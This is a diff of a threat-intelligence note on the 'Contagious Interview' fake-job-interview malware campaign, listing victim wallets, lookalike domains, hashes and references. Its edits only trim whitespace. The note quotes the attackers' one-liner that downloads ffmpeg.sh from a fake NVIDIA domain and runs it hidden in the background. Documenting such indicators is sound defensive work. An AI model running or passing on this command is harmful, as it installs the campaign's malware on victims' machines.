@@ -12,7 +12,7 @@ Tags:: 🎙️ Contagious Interview
 
 `curl -k -o /var/tmp/ffmpeg.sh https://api.nvidia-release.org/ffmpeg-ja.sh && chmod +x /var/tmp/ffmpeg.sh && nohup bash /var/tmp/ffmpeg.sh >/dev/null 2>&1 &`
 
-> Please follow this link to complete the interview: 
+> Please follow this link to complete the interview:
 
 - `https://willointerview.com/invite/halliday`
 
@@ -81,7 +81,7 @@ Tags:: 🎙️ Contagious Interview
 - 0xf8b838f83f355f940e2489bf1cebe366d40b8304 - Victim Dec 13
 - 0x688911c3d5c84cf9b9a13e8eb12682c059c462f7 - Victim Dec 18
 - 0x532bbd2ebf638fa90d9f58a9660502f493713cbf - Victim Nov 28
-- 0xb418b0687f89a44eb58ce40683fbde4d25f829de - Victim Dec 19 
+- 0xb418b0687f89a44eb58ce40683fbde4d25f829de - Victim Dec 19
 - 0xfd5021b332fdec8d3c7454e518fca81a3cf5d74d - Victim 5 Dec 19
 - 0x4838f0e6e93dfd14f8c25a49656457af208a225c - Victim 5 Dec 19
 - 0x2107b55fac26916f048f355b4f3d3746dc20fc0e - Victim 5 Dec 19
@@ -104,7 +104,7 @@ Tags:: 🎙️ Contagious Interview
 - https://github.com/stamparm/maltrail/blob/master/trails/static/malware/apt_lazarus.txt#L3908-L4024
 - https://mp.weixin.qq.com/s?__biz=MzUyMjk4NzExMA==&mid=2247505438&idx=1&sn=cf1947c7af6581f4a66460ae6d14dc2f
 - https://urlscan.io/search/#hash%3A6b7038bab8c410aeb6714e1d98d609a61b6dc3e418a6b5c74a17f2d6d6cb4aaf
-- https://www.virustotal.com/gui/file/33be1a646e5ed46aa707455637e2116715592d1ef63feafb0fd2f66c872a634d/detection    
+- https://www.virustotal.com/gui/file/33be1a646e5ed46aa707455637e2116715592d1ef63feafb0fd2f66c872a634d/detection
 - https://www.virustotal.com/gui/file/a803c043e12a5dac467fae092b75aa08b461b8e9dd4c769cea375ff87287a361/detection
 - https://www.virustotal.com/gui/file/d05f805d172583f1436eac2cfddcc5413ef6be0b37eda98ebca0cb0cfae8ad9e/detection
 - https://www.virustotal.com/gui/ip-address/162.254.39.9/relations
@@ -161,7 +161,7 @@ Tags:: 🎙️ Contagious Interview
 - `app.videoscreening.org`
 - `app.willo-interview.us`
 - `app.willoassess.com`
-- `api.willoassessment.com`    
+- `api.willoassessment.com`
 - `app.willoassessment.com`
 - `app.willocandidate.com`
 - `app.willohiring.com`
@@ -176,8 +176,8 @@ Tags:: 🎙️ Contagious Interview
 - `app.willotalents.org`
 - `app.wtalents.us`
 - `blockchain-assess.com`
-- `app.blockchain-assess.com`  
-- `vid.blockchain-assess.com`      
+- `app.blockchain-assess.com`
+- `vid.blockchain-assess.com`
 - `camera-drive.cloud`
 - `consensys.willoassessment.com`
 - `cpanel.wtalents.us`
@@ -238,8 +238,8 @@ Tags:: 🎙️ Contagious Interview
 ### Hashes:
 
 - `logd` d05f805d172583f1436eac2cfddcc5413ef6be0b37eda98ebca0cb0cfae8ad9e
-- `file.zip` 96e78074218a0f272f7f94805cabde1ef8d64ffb 
-- `nodejs.zip` 86dea05a8f40cf3195e3a6056f2e968c861ed8f1 
+- `file.zip` 96e78074218a0f272f7f94805cabde1ef8d64ffb
+- `nodejs.zip` 86dea05a8f40cf3195e3a6056f2e968c861ed8f1
 - `ffmpeg.sh` `a803c043e12a5dac467fae092b75aa08b461b8e9dd4c769cea375ff87287a361`
 - `ffmpeg.sh` `c6472eb993612db72ca50893a34137ba11173e60a1a4c028d4660a3f755d2490`
 - `nvidia-real.zip` `nvidiaupdate.zip` - `e52118fc7fc9b14e5a8d9f61dfae8b140488ae6ec6f01f41d9e16782febad5f2`
